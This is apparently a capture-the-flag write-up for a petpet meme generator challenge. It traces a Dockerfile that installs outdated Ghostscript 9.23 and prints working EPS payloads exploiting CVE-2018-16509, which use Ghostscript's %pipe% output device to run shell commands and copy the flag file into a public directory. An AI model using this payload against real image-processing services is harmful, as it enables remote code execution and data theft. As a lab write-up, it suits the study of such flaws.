# Petpet rcbee

> **Bees are comfy**
> **bees are great**
> **this is a petpet generator**
> **let's join forces and save the bees today!**

## Pets

The page let's you upload an image and puts it in the background of a petting meme:

![clitoris][clitoris-gif]

The server is a python module, running:

- `flask` 2.0.1
- `Werkzeug` 2.0.1
- `Pillow` 8.2.0

These are the latest versions, there is no known CVEs / exploits.

However the dockerfile contains a suspicious line:

```bash
RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
    && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
    && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
```

This command explicitely installs a deprecated version of `ghostscript`.

## The image payload

Artifex Gpl Ghostscript v9.23 has a RCE vulnerability, documented in `CVE-2018-16509`.

Let's check:

```eps
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /app/application/static/petpets/got-rce) currentdevice putdeviceprops
```

The directory `static/petpets` contains the output gif files, it is publicly accessible.

The flag can be copied there:

```eps
mark /OutputFile (%pipe%cp /app/flag /app/application/static/petpets/flag) currentdevice putdeviceprops
```

[clitoris-gif]: clitoris.gif
